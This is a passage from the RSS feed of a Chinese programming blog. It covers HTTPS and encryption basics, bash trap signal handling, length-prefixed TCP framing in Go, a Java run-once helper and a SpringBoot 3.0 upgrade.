这意味着发送和接收方都必须共享相同的密钥。
对称加密是加密领域中最快的一种加密方式，因为它使用的是相对较小的密钥和简单的运算。&lt;/p>
&lt;p>&lt;strong>非对称加密&lt;/strong>&lt;/p>
&lt;p>非对称加密是一种密码学方法，与对称加密不同，它使用一对密钥而不是一个密钥。
这对密钥包括一个公钥和一个私钥。公钥用于加密数据，而私钥用于解密数据。&lt;/p>
&lt;ul>
&lt;li>公钥： 公钥是一个用于加密的密钥，可以公开被任何人访问，公钥加密的数据只有私钥可以解开。&lt;/li>
&lt;li>私钥： 私钥是与公钥配对的另一个密钥，需要妥善保管避免被泄露。&lt;/li>
&lt;li>加密和解密： 如果使用公钥加密了一段数据，只有拥有相应私钥的人才能解密它。反之亦然，如果使用私钥加密了数据，只有拥有相应公钥的人才能解密。&lt;/li>
&lt;li>数字签名：简单点说数字签名就是私钥加密摘要，而非加密原文，分为下面几个步骤：
&lt;ol>
&lt;li>消息摘要：使用哈希算法把原文生成一份摘要。&lt;/li>
&lt;li>私钥加密：使用私钥对摘要进行加密，得到数字签名。&lt;/li>
&lt;li>发送消息和签名：把原数据和加密后的数据摘要打包一起发给对方。&lt;/li>
&lt;li>验证：接收方使用发送方的公钥来解密数字签名，得到摘要。然后接收方对收到的消息使用同样的哈希算法得到一个新的摘要。如果这两个摘要匹配，说明消息未被篡改，且确实是由私钥的所有者签名的。&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ul>
&lt;p>RSA、DSA、ECDSA 和 Elliptic Curve Diffie-Hellman (ECDH) 是一些常见的非对称加密算法。
这些算法每个有其独特的优点和应用场景，比如 RSA 用于数字签名，ECDH 适用于密钥协商。
与对称加密相比，非对称加密算法的性能都比较低。&lt;/p>
&lt;p>&lt;strong>证书&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>CA：也就是常说的根证书，操作系统默认集成了很多权威机构的根证书，因此不必再自己安装和信任一遍。&lt;/li>
&lt;li>https 证书：通常包括一个公钥证书和一个私钥，它们由权威机构（CA）签发，这些权威机构通常是要收费的，也有免费的机构，类似&lt;a href="https://letsencrypt.org/">Let&amp;rsquo;s Encrypt&lt;/a>。
另一种方式是自己签发，不过需要让客户端信任自己签发的CA证书，目的是为了让自己签发的域名证书通过校验。&lt;/li>
&lt;li>证书签发：就是用权威机构帮你生成一个私钥，并使用它的根证书和这个私钥对你的域名进行证书签发，最后将签发后的公钥证书和这个私钥给你。&lt;/li>
&lt;/ul>
&lt;p>证书是建立信任的关键，包括 CA 根证书、https 证书和自签名证书。CA 提供权威认证，而自签名证书适用于开发环境。&lt;/p>
&lt;p>&lt;strong>https 通信步骤&lt;/strong>&lt;/p>
&lt;p>https 通信大致上是分为3个阶段。&lt;/p>
&lt;ol>
&lt;li>握手阶段（Handshake）：
&lt;ul>
&lt;li>客户端向服务器发送一个加密通信的请求，请求中包含支持的加密算法和其他相关信息。&lt;/li>
&lt;li>服务器将自己的证书、支持的加密算法等信息发送给客户端。&lt;/li>
&lt;li>客户端验证服务器的证书是否有效。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>密钥协商阶段：
&lt;ul>
&lt;li>利用非对称加密算法使得双方安全的获取到一个会话密钥。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>加密通信阶段：
&lt;ul>
&lt;li>客户端和服务器使用协商好的会话密钥进行对称加密通信，保护数据的机密性。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;p>&lt;strong>配置https证书&lt;/strong>&lt;/p>
&lt;p>常见的web服务器都有配置https证书的功能，例如 nginx、caddy等。&lt;/p>
&lt;p>基本上只需要把证书和私钥配置到某一个目录，更改web服务器的配置即可生效。&lt;/p>
&lt;p>&lt;strong>https单向认证&lt;/strong>&lt;/p>
&lt;p>顾名思义，就是只有一个方向进行了认证，这里指的是客户端认证，通常浏览器都会对网站上的https证书进行验证。&lt;/p>
&lt;p>正常情况下访问https站点，浏览器左上角的小锁就会是灰色的。（如果你的浏览器版本过低，有可能是绿色的。）&lt;/p>
&lt;p>当 https 站点的证书不正确时，就会出现一个出现【不安全】这个三个红色的大字，有下面几种原因会导致不安全。&lt;/p>
&lt;ol>
&lt;li>当前域名和证书签名的域名不匹配。（这种情况就需要重新进行域名签发了。）&lt;/li>
&lt;li>当前IP和证书签名的IP不匹配。（这种情况较少，因为之前市面上的机构都不签发IP证书，现在好像也有了不少。）&lt;/li>
&lt;li>证书过期了。（需要定期检查域名是否过期并及时更新）&lt;/li>
&lt;/ol>
&lt;p>&lt;strong>https双向认证&lt;/strong>&lt;/p></description></item><item><title>Linux Shell 实现类似 golang defer 的功能</title><link>https://www.typesafe.cn/posts/linux-shell-defer-implementation/</link><pubDate>Wed, 02 Aug 2023 00:00:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/linux-shell-defer-implementation/</guid><description>&lt;h3 id="基本信息">基本信息&lt;/h3>
&lt;p>trap命令用于指定在接收到信号后将要采取的动作。trap命令有两种格式。&lt;/p>
&lt;ol>
&lt;li>
&lt;p>trap [COMMANDS] [SIGNALS] 此格式用来指定在接收到 SIGNALS 信号列表后将执行的命令。 示例：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">trap&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;echo &amp;#39;Ctrl+C is trapped.&amp;#39;&amp;#34;&lt;/span> SIGINT
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>输出将会在你按下 Ctrl+C 时显示，即在接收到 SIGINT 信号时。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>trap - [SIGNALS] 此格式用来重置SIGNALS的默认处理程序。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">trap&lt;/span> - SIGINT
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>该命令将恢复 SIGINT 信号的默认处理程序。 一旦指定了信号的处理程序，那么在脚本执行过程中，都会保持指定的动作，直到脚本执行结束。如果你想在脚本执行完毕后，不再处理这个信号，你可以使用trap - SIGNALS来重置信号的默认处理程序。&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>你也可以使用 trap -l 列出所有的信号，或者 trap 命令 获取当前的 trap 设置。&lt;/p>
&lt;p>以下是一些常见的信号&lt;/p>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>信号值&lt;/th>
 &lt;th>信号名&lt;/th>
 &lt;th>描述&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>1&lt;/td>
 &lt;td>SIGHUP&lt;/td>
 &lt;td>终止控制进程或者进程组&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>2&lt;/td>
 &lt;td>SIGINT&lt;/td>
 &lt;td>通常由于终端的挂断或者死亡而导致进程也中断&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>3&lt;/td>
 &lt;td>SIGQUIT&lt;/td>
 &lt;td>Quit信号，和SIGINT类似，但由Quit键发出，通常用ctrl+\，执行后会生成core文件&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>9&lt;/td>
 &lt;td>SIGKILL&lt;/td>
 &lt;td>Kill信号，用于结束最不能终止的进程，信号不能被进程捕捉&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>15&lt;/td>
 &lt;td>SIGTERM&lt;/td>
 &lt;td>请求中止进程，kill命令缺省产生这个信号&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h3 id="示例代码">示例代码&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">#!/bin/bash
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cleanup&lt;span style="color:#ff79c6">()&lt;/span> &lt;span style="color:#ff79c6">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">echo&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;Caught Interrupt, cleaning up...&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4"># 在这里放置你的清理代码。例如，删除一些临时文件。&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>exit_handler&lt;span style="color:#ff79c6">()&lt;/span> &lt;span style="color:#ff79c6">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">echo&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;Caught Terminate, exit...&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">exit&lt;/span> &lt;span style="color:#bd93f9">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">trap&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;cleanup&amp;#39;&lt;/span> SIGINT
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">trap&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;exit_handler&amp;#39;&lt;/span> SIGTERM
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">while&lt;/span> true; &lt;span style="color:#ff79c6">do&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sleep &lt;span style="color:#bd93f9">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">echo&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;Sleeping...&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">done&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如何测试这段代码？&lt;/p></description></item><item><title>裸写TCP通信的正确方式</title><link>https://www.typesafe.cn/posts/raw-tcp-best-practice/</link><pubDate>Wed, 19 Jul 2023 21:35:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/raw-tcp-best-practice/</guid><description>&lt;blockquote>
&lt;p>TCP 是一种面向连接的、可靠的、基于字节流的传输层通信协议。&lt;/p>&lt;/blockquote>
&lt;p>由于TCP的特性，在裸写TCP通信的时候，是不能直接把数据序列化为字节后直接发送的，否则就可能会遇到数据包被“截断”或“粘包”的问题。(粘包警察正在赶来。)&lt;/p>
&lt;h3 id="截断的原因">“截断”的原因&lt;/h3>
&lt;p>&lt;strong>数据包之所以被“截断”，是因为网卡的 mtu。&lt;/strong>&lt;/p>
&lt;p>MTU（Maximum Transmission Unit，MTU）的中文名称是【最大传输单元】，它是指网络能够传输的最大数据包大小，以字节为单位。MTU的大小决定了发送端一次能够发送报文的最大字节数。如果MTU超过了接收端所能够承受的最大值，或者是超过了发送路径上途经的某台设备所能够承受的最大值，就会造成报文分片甚至丢弃，加重网络传输的负担。&lt;/p>
&lt;p>普通网卡常见的mtu值是1500，vxlan 等隧道协议的 mtu 则会小于1500，这是因为 vxlan 等隧道协议需要对原始数据进行一层封装，并加上一个包头。&lt;/p>
&lt;h3 id="粘包的原因">“粘包”的原因&lt;/h3>
&lt;p>&lt;strong>而数据包之所以被“粘包”，则是因为不确定消息的边界，接收端根本不知到要拿多少数据。&lt;/strong>&lt;/p>
&lt;p>你说我知道网卡的 mtu 是 1500，那我一次取1500个字节吧，但你拿到的数据报文里面往往会“粘”着下一条消息的一部分。&lt;/p>
&lt;h3 id="解决方案">解决方案&lt;/h3>
&lt;p>因此我们需要一个固定长度的包头，写入消息的时候，把正文的长度写入到包头里面再打包发出，每次读取消息的时候，则先读取固定长度的包头，解析出来正文的长度，再使用正文长度取读取正文。&lt;/p>
&lt;p>代码示例：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-golang" data-lang="golang">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">const&lt;/span> MaxBodyLen = &lt;span style="color:#bd93f9">1&lt;/span>&lt;span style="color:#ff79c6">&amp;lt;&amp;lt;&lt;/span>&lt;span style="color:#bd93f9">32&lt;/span> &lt;span style="color:#ff79c6">-&lt;/span> &lt;span style="color:#bd93f9">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">type&lt;/span> Header [&lt;span style="color:#bd93f9">8&lt;/span>]&lt;span style="color:#8be9fd">byte&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">func&lt;/span> (h Header) &lt;span style="color:#50fa7b">Version&lt;/span>() &lt;span style="color:#8be9fd">int&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">return&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">int&lt;/span>(h[&lt;span style="color:#bd93f9">0&lt;/span>])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">func&lt;/span> (h Header) &lt;span style="color:#50fa7b">Flag&lt;/span>() &lt;span style="color:#8be9fd">int&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">return&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">int&lt;/span>(h[&lt;span style="color:#bd93f9">1&lt;/span>])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">func&lt;/span> (h Header) &lt;span style="color:#50fa7b">BodyLen&lt;/span>() &lt;span style="color:#8be9fd">uint32&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">return&lt;/span> binary.BigEndian.&lt;span style="color:#50fa7b">Uint32&lt;/span>(h[&lt;span style="color:#bd93f9">4&lt;/span>:])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">func&lt;/span> &lt;span style="color:#50fa7b">Read&lt;/span>(conn net.Conn) (Header, []&lt;span style="color:#8be9fd">byte&lt;/span>, &lt;span style="color:#8be9fd">error&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> h &lt;span style="color:#ff79c6">:=&lt;/span> Header{}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _, err &lt;span style="color:#ff79c6">:=&lt;/span> io.&lt;span style="color:#50fa7b">ReadFull&lt;/span>(conn, h[:])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">if&lt;/span> err &lt;span style="color:#ff79c6">!=&lt;/span> &lt;span style="color:#ff79c6">nil&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">return&lt;/span> h, &lt;span style="color:#ff79c6">nil&lt;/span>, err
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> bodyLen &lt;span style="color:#ff79c6">:=&lt;/span> h.&lt;span style="color:#50fa7b">BodyLen&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">if&lt;/span> bodyLen &lt;span style="color:#ff79c6">&amp;lt;=&lt;/span> &lt;span style="color:#bd93f9">0&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">return&lt;/span> h, &lt;span style="color:#ff79c6">nil&lt;/span>, &lt;span style="color:#ff79c6">nil&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> body &lt;span style="color:#ff79c6">:=&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">make&lt;/span>([]&lt;span style="color:#8be9fd">byte&lt;/span>, bodyLen)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _, err = io.&lt;span style="color:#50fa7b">ReadFull&lt;/span>(conn, body)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">if&lt;/span> err &lt;span style="color:#ff79c6">!=&lt;/span> &lt;span style="color:#ff79c6">nil&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">return&lt;/span> h, &lt;span style="color:#ff79c6">nil&lt;/span>, err
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">return&lt;/span> h, body, &lt;span style="color:#ff79c6">nil&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">func&lt;/span> &lt;span style="color:#50fa7b">Write&lt;/span>(conn net.Conn, flag &lt;span style="color:#8be9fd">int&lt;/span>, body []&lt;span style="color:#8be9fd">byte&lt;/span>) &lt;span style="color:#8be9fd">error&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">if&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">len&lt;/span>(body) &amp;gt; MaxBodyLen {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">return&lt;/span> fmt.&lt;span style="color:#50fa7b">Errorf&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;too large body, body length must be &amp;lt;= %d&amp;#34;&lt;/span>, MaxBodyLen)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> bodyLen &lt;span style="color:#ff79c6">:=&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">make&lt;/span>([]&lt;span style="color:#8be9fd">byte&lt;/span>, &lt;span style="color:#bd93f9">4&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> binary.BigEndian.&lt;span style="color:#50fa7b">PutUint32&lt;/span>(bodyLen, &lt;span style="color:#8be9fd;font-style:italic">uint32&lt;/span>(&lt;span style="color:#8be9fd;font-style:italic">len&lt;/span>(body)))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hdr &lt;span style="color:#ff79c6">:=&lt;/span> []&lt;span style="color:#8be9fd">byte&lt;/span>{&lt;span style="color:#bd93f9">0x01&lt;/span>, &lt;span style="color:#8be9fd;font-style:italic">byte&lt;/span>(flag)}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hdr = &lt;span style="color:#8be9fd;font-style:italic">append&lt;/span>(hdr, &lt;span style="color:#8be9fd;font-style:italic">make&lt;/span>([]&lt;span style="color:#8be9fd">byte&lt;/span>, &lt;span style="color:#bd93f9">2&lt;/span>)&lt;span style="color:#ff79c6">...&lt;/span>) &lt;span style="color:#6272a4">// 补2个0让消息头总长度为8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hdr = &lt;span style="color:#8be9fd;font-style:italic">append&lt;/span>(hdr, bodyLen&lt;span style="color:#ff79c6">...&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> writeBody &lt;span style="color:#ff79c6">:=&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">make&lt;/span>([]&lt;span style="color:#8be9fd">byte&lt;/span>, &lt;span style="color:#bd93f9">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> writeBody = &lt;span style="color:#8be9fd;font-style:italic">append&lt;/span>(writeBody, hdr&lt;span style="color:#ff79c6">...&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> writeBody = &lt;span style="color:#8be9fd;font-style:italic">append&lt;/span>(writeBody, body&lt;span style="color:#ff79c6">...&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _, err &lt;span style="color:#ff79c6">:=&lt;/span> conn.&lt;span style="color:#50fa7b">Write&lt;/span>(writeBody)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">return&lt;/span> err
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>在 Java 里如何让方法只执行一次？</title><link>https://www.typesafe.cn/posts/how-does-java-make-methods-execute-only-once/</link><pubDate>Sun, 02 Apr 2023 13:18:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/how-does-java-make-methods-execute-only-once/</guid><description>&lt;p>最近一年时间一直在写 Golang ，也算是对 Golang 有了初步的掌握，再次写 Java 的时候发现有点生疏了，写代码的时候也不自觉代入了写 Golang 的思维。&lt;/p>
&lt;p>正如我想要在 Java 里面想让某一个方法只执行一次的时候，我第一时间想到了 Golang 里面的 &lt;code>Once&lt;/code> 功能。&lt;/p>
&lt;blockquote>
&lt;p>&lt;code>sync.Once&lt;/code> 是 Golang 的一个并发原语，它提供了一种安全地在多个 goroutine 中执行某个函数（或代码块）一次的机制。&lt;/p>
&lt;p>&lt;code>sync.Once&lt;/code> 类型有一个 &lt;code>Do&lt;/code> 方法，该方法接收一个函数作为参数，并确保这个函数只会被执行一次，无论有多少个 goroutine 同时调用它。具体来说，第一个调用 Do 方法的 goroutine 会执行这个函数，而其他 goroutine 则会等待它完成，然后返回相同的结果。&lt;/p>
&lt;p>&lt;code>sync.Once&lt;/code> 可以用于一些需要全局初始化的场景，比如初始化配置信息、数据库连接等。使用 sync.Once 可以确保这些初始化只会被执行一次，并且可以安全地被多个 goroutine 共享使用。&lt;/p>
&lt;p>&amp;ndash; 来自 ChatGPT&lt;/p>&lt;/blockquote>
&lt;p>其实和&lt;code>单例模式&lt;/code>差不多，但我想要的是让方法只执行一次，我魔改了一下，直接上代码吧。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">package&lt;/span> cn.typesafe.sync;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> lombok.SneakyThrows;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> java.util.concurrent.Callable;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">class&lt;/span> &lt;span style="color:#50fa7b">Once&lt;/span>&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>T&lt;span style="color:#ff79c6">&amp;gt;&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#8be9fd;font-style:italic">private&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">volatile&lt;/span> T t &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	@SneakyThrows
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> T &lt;span style="color:#50fa7b">doOnce&lt;/span>(Callable&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>T&lt;span style="color:#ff79c6">&amp;gt;&lt;/span> action) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#ff79c6">if&lt;/span> (t &lt;span style="color:#ff79c6">==&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#8be9fd;font-style:italic">synchronized&lt;/span> (&lt;span style="color:#ff79c6">this&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>				&lt;span style="color:#ff79c6">if&lt;/span> (t &lt;span style="color:#ff79c6">==&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>					t &lt;span style="color:#ff79c6">=&lt;/span> action.&lt;span style="color:#50fa7b">call&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>				}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#ff79c6">return&lt;/span> t;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>单元测试&lt;/p></description></item><item><title>SpringBoot 3.0.0尝鲜与Java打包原生二进制【一】</title><link>https://www.typesafe.cn/posts/kafka-map-springboot3-graalvm-1/</link><pubDate>Sat, 26 Nov 2022 23:44:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/kafka-map-springboot3-graalvm-1/</guid><description>&lt;p>2022年11月24日 SpringBoot 正式发布了 3.0 版本，带来许多新的特性，但我最关心的还是Java打包成原生二进制，运行时不再依赖jre环境，运行Java程序将和Go程序一样方便。&lt;/p>
&lt;h2 id="升级至-springboot-300">升级至 SpringBoot 3.0.0&lt;/h2>
&lt;p>说是尝鲜，但是我不想再试着搞 hello world 那种啥都没有的东西了，找到我之前写的一个Java开源项目 &lt;a href="https://github.com/dushixiang/kafka-map">kafka-map&lt;/a> 拿他开刀。&lt;/p>
&lt;p>&lt;a href="https://github.com/dushixiang/kafka-map">kafka-map&lt;/a> 本身是基于 SpringBoot 2.4.x 开发的，sqlite 存储数据，且很久没有大的更新了，想要直接升级到 SpringBoot 3.0.0 是不可能的，我按照官方文档 &lt;a href="https://github.com/spring-projects/spring-boot/wiki/Spring-Boot-3.0-Migration-Guide">Spring Boot 3.0 迁移指南&lt;/a> 首先升级到最新2.7.x版本，然后就发现 service 依赖循环了，这个时候有两种选择，一是在配置文件中允许依赖循环 &lt;code>spring.main.allow-circular-references: true&lt;/code>，二是梳理业务逻辑解决依赖循环的问题。作为一个合格的开发，我选择了解决依赖循环的问题，过程不表。&lt;/p>
&lt;p>SpringBoot 3.0.0 升级了很多组件，其中 Jpa 依赖的 Hibernate 升级到了 6.x，我启动时又遇到了 sqlite 方言插件不可用的问题，还好 Hibernate 6.x 已经支持了 sqlite方言，切换到官方插件就好了。配置文件如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-yaml" data-lang="yaml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">spring&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">datasource&lt;/span>:
